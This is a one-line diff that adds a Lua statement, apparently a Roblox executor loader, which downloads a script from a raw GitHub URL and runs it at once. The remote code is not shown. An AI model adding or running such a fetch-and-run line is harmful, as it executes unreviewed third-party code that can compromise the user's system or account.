@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/heyhisupbro/this-one-cool-thing/refs/heads/main/script",true))()
